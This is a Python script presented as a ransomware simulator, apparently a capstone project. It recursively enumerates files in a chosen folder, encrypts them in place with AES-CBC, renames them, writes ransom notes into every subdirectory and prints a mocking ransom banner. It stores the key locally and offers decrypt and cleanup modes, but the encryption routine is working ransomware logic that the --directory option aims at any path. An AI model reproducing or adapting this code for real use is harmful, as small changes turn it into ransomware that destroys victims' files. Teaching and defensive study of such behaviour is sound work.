#!/usr/bin/env python3

# virus will be aimed at custom_target
CUSTOM_TARGET = r"C:\Users\Capstone\Documents\ransom\test_dir"  # Change this to aim the virus at a specific folder
# Examples:
#   CUSTOM_TARGET = r"C:\TestFolder"
#   CUSTOM_TARGET = r"C:\Users\Capstone\Documents\MyTestFolder"
#   CUSTOM_TARGET = r"D:\BackupCopy"
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
import os
import time
import hashlib
import argparse
import json
import base64
from pathlib import Path
from datetime import datetime


class RansomwareSimulator:
    def __init__(self, test_directory="./test_target", verbose=True, recursive=True):
        """Initialize the simulator with a test directory."""
        self.test_dir = Path(test_directory)
        self.verbose = verbose
        self.recursive = recursive
        self.encrypted_files = []
        self.key = None
        self.iv = None

    def log(self, message):
        """Print log messages if verbose mode is enabled."""
        if self.verbose:
            timestamp = datetime.now().strftime("%H:%M:%S")
            print(f"[{timestamp}] {message}")

    def _write_params(self):
        """Store the key/iv on disk so a later run can decrypt."""
        params = {
            "key": base64.b64encode(self.key).decode(),
            "iv": base64.b64encode(self.iv).decode()
        }
        path = self.test_dir / "encryption_params.json"
        path.write_text(json.dumps(params))

    def _read_params(self):
        """Load key/iv from disk; return False if the file is missing."""
        path = self.test_dir / "encryption_params.json"
        if not path.exists():
            return False
        data = json.loads(path.read_text())
        self.key = base64.b64decode(data["key"])
        self.iv = base64.b64decode(data["iv"])
        return True

    def simulate_file_discovery(self):
        """Simulate ransomware file discovery behavior."""
        self.log("\nSimulating file system enumeration.")
        time.sleep(0.5)

        files_found = []

        if self.recursive:
            # look through all subdirectories
            self.log("Scanning recursively through all subdirectories...")
            for file in self.test_dir.rglob("*"):
                if file.is_file() and not file.name.endswith(".encrypted"):
                    files_found.append(file)
                    rel_path = file.relative_to(self.test_dir)
                    self.log(f"Discovered: {rel_path} ({file.stat().st_size} bytes)")
        else:
            # top‑level only
            self.log("Scanning top-level directory only...")
            for file in self.test_dir.glob("*"):
                if file.is_file() and not file.name.endswith(".encrypted"):
                    files_found.append(file)
                    self.log(f"Discovered: {file.name} ({file.stat().st_size} bytes)")

        self.log(f"\nTotal files discovered: {len(files_found)}")
        return files_found

    def simulate_encryption(self, files):
        """Encrypt files using AES‑CBC."""
        self.log("\nfile encryption process.")
        self.log(f"Processing {len(files)} files...")

        # generate random key/iv and persist them
        self.key = os.urandom(32)
        self.iv = os.urandom(16)
        self._write_params()

        for idx, file in enumerate(files, 1):
            try:
                rel_path = file.relative_to(self.test_dir)
                self.log(f"[{idx}/{len(files)}] Processing: {rel_path}")

                # read, pad, encrypt
                original_content = file.read_bytes()
                padder = padding.PKCS7(128).padder()
                padded_data = padder.update(original_content) + padder.finalize()
                cipher = Cipher(algorithms.AES(self.key), modes.CBC(self.iv), backend=default_backend())
                encryptor = cipher.encryptor()
                encrypted_content = encryptor.update(padded_data) + encryptor.finalize()

                file.write_bytes(encrypted_content)
                new_name = file.with_suffix(file.suffix + ".encrypted")
                file.rename(new_name)
                self.encrypted_files.append(new_name)
                time.sleep(0.1)

            except Exception as e:
                self.log(f"Error processing {file.name}: {e}")

    def simulate_ransom_note_creation(self):
        """Create ransom note."""
        self.log("\nCreating ransom note.")

        ransom_note = """
RANSOM NOTE:
To restore files, run this script with --decrypt

Test ID: {test_id}
Timestamp: {timestamp}
Files Affected: {file_count}
""".format(
            test_id=hashlib.md5(str(time.time()).encode()).hexdigest()[:8],
            timestamp=datetime.now().isoformat(),
            file_count=len(self.encrypted_files),
        )

        note_path = self.test_dir / "README_SIMULATION.txt"
        note_path.write_text(ransom_note)
        self.log(f"Ransom note created: {note_path.name}")

        if self.recursive:
            for subdir in self.test_dir.rglob("*"):
                if subdir.is_dir():
                    subdir_note = subdir / "README_SIMULATION.txt"
                    subdir_note.write_text(ransom_note)
                    rel_path = subdir.relative_to(self.test_dir)
                    self.log(f"Ransom note created: {rel_path}/README_SIMULATION.txt")

    def decrypt_files(self):
        """Decrypt the test files."""
        self.log("\nDecrypting files.")

        # load parameters if necessary
        if self.key is None or self.iv is None:
            if not self._read_params():
                self.log("ERROR: Encryption key or IV not found. Cannot decrypt.")
                return

        # locate encrypted files
        if self.recursive:
            encrypted_files = list(self.test_dir.rglob("*.encrypted"))
        else:
            encrypted_files = list(self.test_dir.glob("*.encrypted"))

        if not encrypted_files:
            self.log("No encrypted files found to decrypt.")
            return

        self.log(f"Found {len(encrypted_files)} encrypted files")

        for idx, file in enumerate(encrypted_files, 1):
            try:
                rel_path = file.relative_to(self.test_dir)
                self.log(f"[{idx}/{len(encrypted_files)}] Restoring: {rel_path}")
                encrypted_content = file.read_bytes()

                cipher = Cipher(algorithms.AES(self.key), modes.CBC(self.iv), backend=default_backend())
                decryptor = cipher.decryptor()
                padded_content = decryptor.update(encrypted_content) + decryptor.finalize()

                unpadder = padding.PKCS7(128).unpadder()
                original_content = unpadder.update(padded_content) + unpadder.finalize()

                original_name = file.with_suffix("")
                original_name.write_bytes(original_content)
                file.unlink()

            except Exception as e:
                self.log(f"Error restoring {file.name}: {e}")

        self.log("\nRemoving ransom notes...")
        for note in self.test_dir.rglob("README_SIMULATION.txt"):
            note.unlink()
            rel_path = note.relative_to(self.test_dir)
            self.log(f"Removed: {rel_path}")

    def cleanup(self):
        """Clean up encrypted files and ransom notes (but keep original directory structure)."""
        self.log("\nCleaning up encrypted files and ransom notes.")

        if self.recursive:
            encrypted_files = list(self.test_dir.rglob("*.encrypted"))
        else:
            encrypted_files = list(self.test_dir.glob("*.encrypted"))

        for file in encrypted_files:
            file.unlink()
            rel_path = file.relative_to(self.test_dir)
            self.log(f"Deleted: {rel_path}")

        for note in self.test_dir.rglob("README_SIMULATION.txt"):
            note.unlink()
            rel_path = note.relative_to(self.test_dir)
            self.log(f"Deleted: {rel_path}")

        self.log("Cleanup complete (original files preserved if decrypted)")

    def run_simulation(self):
        """Execute the full ransomware behavior simulation."""

        if not self.test_dir.exists():
            print(f"ERROR: Directory does not exist: {self.test_dir.absolute()}")
            print("Please specify an existing directory with --directory")
            return

        if self.recursive:
            file_count = len(list(self.test_dir.rglob("*")))
        else:
            file_count = len(list(self.test_dir.glob("*")))

        if file_count == 0:
            print(f"WARNING: No files found in {self.test_dir.absolute()}")
            print("Please ensure the directory contains files to encrypt")
            return

        print("\n===== RANSOMWARE SIMULATOR - TARGETING EXISTING FILES =====")
        if self.recursive:
            print("  Mode: RECURSIVE (all subdirectories)")
        else:
            print("  Mode: TOP-LEVEL ONLY")
        print(f"  Target: {self.test_dir.absolute()}")

        files = self.simulate_file_discovery()
        if not files:
            print("No files found to encrypt")
            return

        self.simulate_encryption(files)
        self.simulate_ransom_note_creation()

        print("\n===== Encryption COMPLETE =====")
        print(f"\nFiles encrypted: {len(self.encrypted_files)}")
        print(f"Test directory: {self.test_dir.absolute()}")
        print("\n+",('='*87),"+")
        print("|",(' '*87),"|")
        print("|",(' '*87),"|")
        print("|                     Oh dude you shouldn't have believed that email!                     |")
        print("|                               Now your system is locked!                                |")
        print("|                        Don't bother trying to decrypt your files!                       |")
        print("|                                I used AES encryption!                                   |")
        print("|                               Your files are now mine!                                  |")
        print("|                      However if you ask nicely, I might consider                        |")
        print("|                               returning your files...                                   |")
        print("|          Ok here you go just enter the line below into your command terminal            |")
        print("|",(' '*87),"|")
        print("|    python ransomware_simulator.py --decrypt --directory \""+ str(self.test_dir)+"\"     |")
        print("|",(' '*87),"|")
        print("|",(' '*87),"|")
        print("|                              Next time be more careful!                                 |")
        print("|",(' '*87),"|")
        print("+",('='*87),"+")

        print("To clean up: python ransomware_simulator.py --cleanup --directory \""+ str(self.test_dir)+ "\"\n")


def main():
    parser = argparse.ArgumentParser(description="Ransomware Virus Simulator")
    parser.add_argument("--decrypt", action="store_true", help="Decrypt the encrypted files")
    parser.add_argument("--cleanup", action="store_true", help="Delete directory contents")
    parser.add_argument(
        "--directory", default=CUSTOM_TARGET, help="Use to aim the virus"
    )
    parser.add_argument("--quiet", action="store_true", help="Do not display log")
    parser.add_argument(
        "--no-recursive", action="store_true", help="Don't encrypt sub directories"
    )

    args = parser.parse_args()

    simulator = RansomwareSimulator(
        test_directory=args.directory, verbose=not args.quiet, recursive=not args.no_recursive
    )

    if args.decrypt:
        simulator.decrypt_files()
    elif args.cleanup:
        simulator.cleanup()
    else:
        simulator.run_simulation()


if __name__ == "__main__":
    main()